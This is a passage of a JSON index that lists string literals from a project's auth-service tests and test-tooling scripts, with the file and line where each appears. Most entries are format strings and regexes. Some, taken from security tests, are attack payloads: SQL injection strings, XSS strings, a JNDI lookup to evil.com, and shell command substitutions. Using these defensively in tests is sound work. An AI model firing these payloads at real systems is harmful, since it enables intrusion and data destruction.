      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:92"
      ]
    },
    "$(echo \"${BASE_SERVICE}-${ENV_SUFFIX}\")": {
      "value": "$(echo \"${BASE_SERVICE}-${ENV_SUFFIX}\")",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:230",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:238"
      ]
    },
    "$(echo \"${K_SERVICE}-${HOSTNAME}\")": {
      "value": "$(echo \"${K_SERVICE}-${HOSTNAME}\")",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:133",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:146"
      ]
    },
    "$(echo \"${LONG_VALUE}-${LONG_VALUE}-${LONG_VALUE}\")": {
      "value": "$(echo \"${LONG_VALUE}-${LONG_VALUE}-${LONG_VALUE}\")",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:337",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:350"
      ]
    },
    "$(echo $USER)": {
      "value": "$(echo $USER)",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:93"
      ]
    },
    "$(hostname)": {
      "value": "$(hostname)",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:71",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:79"
      ]
    },
    "$(id -un)": {
      "value": "$(id -un)",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:98"
      ]
    },
    "$(uname -n)": {
      "value": "$(uname -n)",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:91"
      ]
    },
    "$(whoami | tr -d \"\\n\")": {
      "value": "$(whoami | tr -d \"\\n\")",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:165",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:180"
      ]
    },
    "$(whoami)": {
      "value": "$(whoami)",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:43",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:52",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:289"
      ]
    },
    "$(whoami)-$(hostname)": {
      "value": "$(whoami)-$(hostname)",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:96"
      ]
    },
    "$HOSTNAME": {
      "value": "$HOSTNAME",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:56"
      ]
    },
    "$RANDOM": {
      "value": "$RANDOM",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:97"
      ]
    },
    "$USER": {
      "value": "$USER",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:56"
      ]
    },
    "$argon2id$": {
      "value": "$argon2id$",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:102"
      ]
    },
    "${": {
      "value": "${",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:56",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:116"
      ]
    },
    "${BASE_SERVICE}": {
      "value": "${BASE_SERVICE}",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:243"
      ]
    },
    "${ENV_SUFFIX}": {
      "value": "${ENV_SUFFIX}",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:243"
      ]
    },
    "${HOSTNAME}": {
      "value": "${HOSTNAME}",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:95",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:152"
      ]
    },
    "${INSTANCE_ID}": {
      "value": "${INSTANCE_ID}",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:209"
      ]
    },
    "${INSTANCE_ID}-${REGION}": {
      "value": "${INSTANCE_ID}-${REGION}",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:201",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:216"
      ]
    },
    "${K_SERVICE}": {
      "value": "${K_SERVICE}",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:152"
      ]
    },
    "${REGION}": {
      "value": "${REGION}",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:212"
      ]
    },
    "${TIMEOUT}": {
      "value": "${TIMEOUT}",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:347",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:369"
      ]
    },
    "${jndi:ldap://evil.com/exploit}": {
      "value": "${jndi:ldap://evil.com/exploit}",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:103"
      ]
    },
    "%": {
      "value": "%",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:143",
        "scripts/batch_fix_and_test.py:123",
        "scripts/batch_fix_and_test.py:133",
        "scripts/business_value_test_index.py:747",
        "scripts/business_value_test_index.py:748",
        "scripts/business_value_test_index.py:749",
        "scripts/check_test_compliance.py:161",
        "scripts/compliance/test_violations_reporter.py:53",
        "scripts/comprehensive_test_fixer.py:396",
        "scripts/real_service_test_metrics.py:139"
      ]
    },
    "%\n\n## Test Results": {
      "value": "%\n\n## Test Results",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:171"
      ]
    },
    "% goal": {
      "value": "% goal",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:134"
      ]
    },
    "% to reach": {
      "value": "% to reach",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:134"
      ]
    },
    "% to target 85%": {
      "value": "% to target 85%",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:694"
      ]
    },
    "%(asctime)s - %(levelname)s - %(message)s": {
      "value": "%(asctime)s - %(levelname)s - %(message)s",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:19",
        "scripts/auto_fix_test_sizes.py:29",
        "scripts/auto_fix_test_violations.py:43",
        "scripts/fix_test_utils_imports.py:19",
        "scripts/test_cold_start_e2e.py:38"
      ]
    },
    "%(asctime)s - %(name)s - %(levelname)s - %(message)s": {
      "value": "%(asctime)s - %(name)s - %(levelname)s - %(message)s",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:21",
        "auth_service/test_staging_db_connection.py:26",
        "auth_service/test_url_construction.py:22",
        "auth_service/tests/config/test_settings.py:79",
        "scripts/test_backend_optimized.py:47",
        "scripts/test_coordination_fixes.py:25"
      ]
    },
    "%)": {
      "value": "%)",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:751",
        "scripts/test_example_message_flow.py:341"
      ]
    },
    "%)\n\n### Conclusion:\nThe script is **PRODUCTION READY** and properly handles:\n- GitHub API connectivity (when valid token provided)\n- Argument validation and error handling\n- Multiple output formats\n- Workflow status verification\n\nAll \"failures\" in testing are **expected behaviors** when using invalid tokens or non-existent repositories.\nThe script correctly identifies these scenarios and reports appropriate errors.": {
      "value": "%)\n\n### Conclusion:\nThe script is **PRODUCTION READY** and properly handles:\n- GitHub API connectivity (when valid token provided)\n- Argument validation and error handling\n- Multiple output formats\n- Workflow status verification\n\nAll \"failures\" in testing are **expected behaviors** when using invalid tokens or non-existent repositories.\nThe script correctly identifies these scenarios and reports appropriate errors.",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:246"
      ]
    },
    "%, target: 75%)": {
      "value": "%, target: 75%)",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:701"
      ]
    },
    "%Y%m%d_%H%M%S": {
      "value": "%Y%m%d_%H%M%S",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:753",
        "scripts/comprehensive_test_fixer.py:404",
        "scripts/fix_test_batch.py:372",
        "scripts/test_staging_deployment.py:224",
        "scripts/unified_test_runner.py:664"
      ]
    },
    "%Y-%m-%d %H:%M:%S": {
      "value": "%Y-%m-%d %H:%M:%S",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:854",
        "scripts/autonomous_review/test_generator.py:99"
      ]
    },
    "&": {
      "value": "&",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:133",
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:62",
        "auth_service/tests/test_critical_oauth_environment_failures.py:366"
      ]
    },
    "&state=": {
      "value": "&state=",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:213",
        "auth_service/tests/integration/test_auth_oauth_errors.py:290",
        "auth_service/tests/integration/test_auth_oauth_errors.py:362",
        "auth_service/tests/integration/test_auth_oauth_errors.py:479",
        "auth_service/tests/integration/test_auth_oauth_google.py:144",
        "auth_service/tests/integration/test_auth_oauth_google.py:215",
        "auth_service/tests/integration/test_auth_oauth_google.py:285",
        "auth_service/tests/integration/test_auth_oauth_google.py:371",
        "auth_service/tests/integration/test_auth_oauth_google.py:442"
      ]
    },
    "&state=123456": {
      "value": "&state=123456",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:517"
      ]
    },
    "&state=invalid_state": {
      "value": "&state=invalid_state",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_google.py:378"
      ]
    },
    "&state=other_session_state": {
      "value": "&state=other_session_state",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:525"
      ]
    },
    "&state=predictable_state": {
      "value": "&state=predictable_state",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:518"
      ]
    },
    "&state=reused_state_123": {
      "value": "&state=reused_state_123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:521",
        "auth_service/tests/integration/test_auth_oauth_errors.py:522"
      ]
    },
    "'": {
      "value": "'",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:69",
        "auth_service/tests/test_critical_oauth_environment_failures.py:71",
        "auth_service/tests/test_critical_oauth_environment_failures.py:110",
        "auth_service/tests/test_critical_oauth_environment_failures.py:112",
        "auth_service/tests/test_critical_oauth_environment_failures.py:150",
        "auth_service/tests/test_critical_oauth_environment_failures.py:152",
        "auth_service/tests/test_critical_oauth_environment_failures.py:213",
        "auth_service/tests/test_critical_oauth_environment_failures.py:220",
        "auth_service/tests/test_critical_oauth_environment_failures.py:227",
        "auth_service/tests/test_critical_oauth_environment_failures.py:278"
      ]
    },
    "' (current:": {
      "value": "' (current:",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:711"
      ]
    },
    "' (length:": {
      "value": "' (length:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:324",
        "auth_service/tests/test_critical_oauth_environment_failures.py:330"
      ]
    },
    "' -> '": {
      "value": "' -> '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:282",
        "auth_service/tests/test_critical_oauth_environment_failures.py:284",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:323"
      ]
    },
    "' OR '1'='1": {
      "value": "' OR '1'='1",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:84"
      ]
    },
    "' UNION SELECT * FROM users --": {
      "value": "' UNION SELECT * FROM users --",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:86"
      ]
    },
    "' appears too frequently:": {
      "value": "' appears too frequently:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_state_security.py:235"
      ]
    },
    "' caused expected failure:": {
      "value": "' caused expected failure:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:134"
      ]
    },
    "' converted to:": {
      "value": "' converted to:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:380"
      ]
    },
    "' correctly caused ValueError:": {
      "value": "' correctly caused ValueError:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:384"
      ]
    },
    "' defined in test file": {
      "value": "' defined in test file",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:175",
        "scripts/compliance/project_test_validator.py:187",
        "scripts/compliance/real_test_requirements_enforcer.py:248",
        "scripts/compliance/real_test_requirements_enforcer.py:265",
        "scripts/compliance/real_test_validator.py:128",
        "scripts/compliance/real_test_validator.py:139"
      ]
    },
    "' exceeds": {
      "value": "' exceeds",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:232"
      ]
    },
    "' from command '": {
      "value": "' from command '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:119"
      ]
    },
    "' from input '": {
      "value": "' from input '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:321"
      ]
    },
    "' has": {
      "value": "' has",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:459",
        "scripts/auto_fix_test_violations.py:237",
        "scripts/auto_fix_test_violations.py:249",
        "scripts/auto_fix_test_violations.py:274",
        "scripts/auto_fix_test_violations.py:294",
        "scripts/auto_fix_test_violations.py:307",
        "scripts/compliance/project_test_validator.py:251",
        "scripts/compliance/real_test_requirements_enforcer.py:329",
        "scripts/compliance/real_test_validator.py:213",
        "scripts/compliance/test_limits_checker.py:156"
      ]
    },
    "' has high average complexity (": {
      "value": "' has high average complexity (",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:465"
      ]
    },
    "' into smaller, focused test functions": {
      "value": "' into smaller, focused test functions",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:331"
      ]
    },
    "' not configured": {
      "value": "' not configured",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:429"
      ]
    },
    "' not found": {
      "value": "' not found",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:373"
      ]
    },
    "' not in execution list": {
      "value": "' not in execution list",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:260"
      ]
    },
    "' not properly validated:": {
      "value": "' not properly validated:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:237"
      ]
    },
    "' resulted in non-positive value:": {
      "value": "' resulted in non-positive value:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:374"
      ]
    },
    "' resulted in unreasonably large value:": {
      "value": "' resulted in unreasonably large value:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:378"
      ]
    },
    "' should be blocked": {
      "value": "' should be blocked",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:176"
      ]
    },
    "' should not convert to float:": {
      "value": "' should not convert to float:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:370"
      ]
    },
    "' spans": {
      "value": "' spans",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:448"
      ]
    },
    "' to a shared fixture or use real components": {
      "value": "' to a shared fixture or use real components",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:267"
      ]
    },
    "' to a shared test utility module or use real components": {
      "value": "' to a shared test utility module or use real components",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:250"
      ]
    },
    "'''": {
      "value": "'''",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:156",
        "scripts/compliance/project_test_validator.py:235",
        "scripts/compliance/project_test_validator.py:236",
        "scripts/compliance/real_test_requirements_enforcer.py:312",
        "scripts/compliance/real_test_validator.py:197",
        "scripts/compliance/test_fixer.py:176",
        "scripts/fix_all_test_issues.py:142",
        "scripts/fix_test_syntax_errors.py:84",
        "scripts/fix_test_syntax_errors.py:88"
      ]
    },
    "', got '": {
      "value": "', got '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:118",
        "auth_service/tests/utils/assertion_helpers.py:170",
        "auth_service/tests/utils/assertion_helpers.py:264",
        "auth_service/tests/utils/assertion_helpers.py:271"
      ]
    },
    "':": {
      "value": "':",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:288",
        "auth_service/tests/test_critical_oauth_environment_failures.py:369",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:59",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:119",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:177",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:327",
        "scripts/test_verify_workflow_status_corrected.py:49"
      ]
    },
    "': '": {
      "value": "': '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:321"
      ]
    },
    "': Expected pass=": {
      "value": "': Expected pass=",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:406"
      ]
    },
    "'; DROP TABLE oauth_codes; --": {
      "value": "'; DROP TABLE oauth_codes; --",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:317"
      ]
    },
    "'; DROP TABLE users; --": {
      "value": "'; DROP TABLE users; --",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:83",
        "auth_service/tests/test_security.py:508",
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:448",
        "auth_service/tests/unit/test_oauth_pkce_validation.py:173"
      ]
    },
    "'; INSERT INTO users VALUES('hacker','pass'); --": {
      "value": "'; INSERT INTO users VALUES('hacker','pass'); --",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:87"
      ]
    },
    "'; eval(atob('YWxlcnQoJ1hTUycpOw=='));//": {
      "value": "'; eval(atob('YWxlcnQoJ1hTUycpOw=='));//",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:101"
      ]
    },
    "';alert('XSS');//": {
      "value": "';alert('XSS');//",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:94"
      ]
    },
    "(": {
      "value": "(",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:173",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:318",
        "auth_service/tests/test_graceful_shutdown_failures.py:403",
        "auth_service/tests/test_graceful_shutdown_failures.py:411",
        "scripts/align_test_imports.py:385",
        "scripts/auto_fix_test_sizes.py:259",
        "scripts/auto_fix_test_sizes.py:445",
        "scripts/auto_fix_test_sizes.py:653",
        "scripts/auto_fix_test_violations.py:622",
        "scripts/auto_fix_test_violations.py:806"
      ]
    },
    "()": {
      "value": "()",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:291"
      ]
    },
    "() -": {
      "value": "() -",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_violations_reporter.py:123"
      ]
    },
    "() returned empty value in staging": {
      "value": "() returned empty value in staging",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:405"
      ]
    },
    "() returned placeholder: '": {
      "value": "() returned placeholder: '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:409"
      ]
    },
    "():": {
      "value": "():",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:418",
        "auth_service/tests/test_critical_oauth_environment_failures.py:420",
        "scripts/auto_fix_test_sizes.py:570",
        "scripts/auto_fix_test_sizes.py:572"
      ]
    },
    "(*args, **kwargs):\n    \"\"\"Create item - test stub implementation.\"\"\"\n    return {\"status\": \"created\", \"id\": \"new_id\"}": {
      "value": "(*args, **kwargs):\n    \"\"\"Create item - test stub implementation.\"\"\"\n    return {\"status\": \"created\", \"id\": \"new_id\"}",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:120"
      ]
    },
    "(*args, **kwargs):\n    \"\"\"Delete item - test stub implementation.\"\"\"\n    return {\"status\": \"deleted\"}": {
      "value": "(*args, **kwargs):\n    \"\"\"Delete item - test stub implementation.\"\"\"\n    return {\"status\": \"deleted\"}",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:129"
      ]
    },
    "(*args, **kwargs):\n    \"\"\"Get all items - test stub implementation.\"\"\"\n    return []": {
      "value": "(*args, **kwargs):\n    \"\"\"Get all items - test stub implementation.\"\"\"\n    return []",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:102"
      ]
    },
    "(*args, **kwargs):\n    \"\"\"Process data - test stub implementation.\"\"\"\n    return {\"status\": \"processed\", \"result\": \"success\"}": {
      "value": "(*args, **kwargs):\n    \"\"\"Process data - test stub implementation.\"\"\"\n    return {\"status\": \"processed\", \"result\": \"success\"}",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:147"
      ]
    },
    "(*args, **kwargs):\n    \"\"\"Stream data - test stub implementation.\"\"\"\n    for i in range(3):\n        yield f\"Chunk {i+1}\"": {
      "value": "(*args, **kwargs):\n    \"\"\"Stream data - test stub implementation.\"\"\"\n    for i in range(3):\n        yield f\"Chunk {i+1}\"",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:154"
      ]
    },
    "(*args, **kwargs):\n    \"\"\"Test stub implementation for": {
      "value": "(*args, **kwargs):\n    \"\"\"Test stub implementation for",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:164"
      ]
    },
    "(*args, **kwargs):\n    \"\"\"Update item - test stub implementation.\"\"\"\n    return {\"status\": \"updated\", \"id\": kwargs.get('id', '1')}": {
      "value": "(*args, **kwargs):\n    \"\"\"Update item - test stub implementation.\"\"\"\n    return {\"status\": \"updated\", \"id\": kwargs.get('id', '1')}",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:111"
      ]
    },
    "(*args, **kwargs):\n    \"\"\"Verify/validate - test stub implementation.\"\"\"\n    return True": {
      "value": "(*args, **kwargs):\n    \"\"\"Verify/validate - test stub implementation.\"\"\"\n    return True",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:138"
      ]
    },
    "(?:# Add project root to path\\n)?import sys\\nfrom pathlib import Path\\nPROJECT_ROOT = Path\\(__file__\\)\\.parent\\.parent\\.parent\\nif str\\(PROJECT_ROOT\\) not in sys\\.path:\\n    sys\\.path\\.insert\\(0, str\\(PROJECT_ROOT\\)\\)\\n\\n?\\n?": {
      "value": "(?:# Add project root to path\\n)?import sys\\nfrom pathlib import Path\\nPROJECT_ROOT = Path\\(__file__\\)\\.parent\\.parent\\.parent\\nif str\\(PROJECT_ROOT\\) not in sys\\.path:\\n    sys\\.path\\.insert\\(0, str\\(PROJECT_ROOT\\)\\)\\n\\n?\\n?",
      "category": "test_literals",
      "locations": [
        "scripts/remove_duplicate_test_setup.py:19"
      ]
    },
    "(?:async )?def (test_\\w+)": {
      "value": "(?:async )?def (test_\\w+)",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:155"
      ]
    },
    "(?:test|it|describe)\\s*\\(\\s*['\\\"`]([^'\\\"`]+)['\\\"`]": {
      "value": "(?:test|it|describe)\\s*\\(\\s*['\\\"`]([^'\\\"`]+)['\\\"`]",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:318"
      ]
    },
    "(@pytest\\.mark\\.\\w+)\\s*\\n\\s*\\n\\s*(async def)": {
      "value": "(@pytest\\.mark\\.\\w+)\\s*\\n\\s*\\n\\s*(async def)",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:59",
        "scripts/batch_fix_and_test.py:29",
        "scripts/simple_test_fix_loop.py:53"
      ]
    },
    "(@pytest\\.mark\\.\\w+)\\s*\\n\\s*\\n\\s*(def)": {
      "value": "(@pytest\\.mark\\.\\w+)\\s*\\n\\s*\\n\\s*(def)",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:35"
      ]
    },
    "(@pytest\\.mark\\.real_llm.*?\\n)(class |def |async def )": {
      "value": "(@pytest\\.mark\\.real_llm.*?\\n)(class |def |async def )",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:186"
      ]
    },
    "(Address when convenient)": {
      "value": "(Address when convenient)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:496"
      ]
    },
    "(JS/TS)": {
      "value": "(JS/TS)",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:56"
      ]
    },
    "(Must fix immediately)": {
      "value": "(Must fix immediately)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:494"
      ]
    },
    "(Priority:": {
      "value": "(Priority:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:179"
      ]
    },
    "(Score:": {
      "value": "(Score:",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:755"
      ]
    },
    "(Should fix soon)": {
      "value": "(Should fix soon)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:495"
      ]
    },
    "([\\w/\\\\\\.]+::\\S+)": {
      "value": "([\\w/\\\\\\.]+::\\S+)",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:143"
      ]
    },
    "([^\\s]+\\.py)": {
      "value": "([^\\s]+\\.py)",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:37"
      ]
    },
    "(\\d+) failed": {
      "value": "(\\d+) failed",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:642"
      ]
    },
    "(\\d+) failed.*(\\d+) passed": {
      "value": "(\\d+) failed.*(\\d+) passed",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:150"
      ]
    },
    "(\\d+) passed": {
      "value": "(\\d+) passed",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:636"
      ]
    },
    "(\\d+)\\s+passed.*?(\\d+)\\s+total": {
      "value": "(\\d+)\\s+passed.*?(\\d+)\\s+total",
      "category": "test_literals",
      "locations": [
        "scripts/team_updates_test_analyzer.py:107"
      ]
    },
    "(\\s+)def __init__\\(self\\):\\s*\\n(\\s+)super\\(\\).__init__\\(\\)\\s*\\n": {
      "value": "(\\s+)def __init__\\(self\\):\\s*\\n(\\s+)super\\(\\).__init__\\(\\)\\s*\\n",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_syntax_fix_classes.py:22"
      ]
    },
    "(\\w+)\\.return_value = (.+)": {
      "value": "(\\w+)\\.return_value = (.+)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:325"
      ]
    },
    "(\\w+)\\.side_effect = (.+)": {
      "value": "(\\w+)\\.side_effect = (.+)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:326"
      ]
    },
    "(\\w+)\\s*\\(": {
      "value": "(\\w+)\\s*\\(",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:220"
      ]
    },
    "(^|\\n)(async def": {
      "value": "(^|\\n)(async def",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:101"
      ]
    },
    "(^|\\n)(class": {
      "value": "(^|\\n)(class",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:64"
      ]
    },
    "(class TestSyntaxFix.*?\\n)(.*?)(?=\\nclass |\\Z)": {
      "value": "(class TestSyntaxFix.*?\\n)(.*?)(?=\\nclass |\\Z)",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_syntax_fix_classes.py:15"
      ]
    },
    "(currently": {
      "value": "(currently",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:362"
      ]
    },
    "(end-to-end tests)": {
      "value": "(end-to-end tests)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:372"
      ]
    },
    "(exception)": {
      "value": "(exception)",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:257"
      ]
    },
    "(excluding dependencies)": {
      "value": "(excluding dependencies)",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:277"
      ]
    },
    "(expected format: resource:action)": {
      "value": "(expected format: resource:action)",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:217"
      ]
    },
    "(expected:": {
      "value": "(expected:",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:46"
      ]
    },
    "(integration tests)": {
      "value": "(integration tests)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:201",
        "scripts/compliance/test_size_validator.py:371"
      ]
    },
    "(matched:": {
      "value": "(matched:",
      "category": "test_literals",
      "locations": [
        "scripts/test_exclusion_check.py:40"
      ]
    },
    "(self):": {
      "value": "(self):",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:285"
      ]
    },
    "(self):\n        \"\"\"Test": {
      "value": "(self):\n        \"\"\"Test",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:215"
      ]
    },
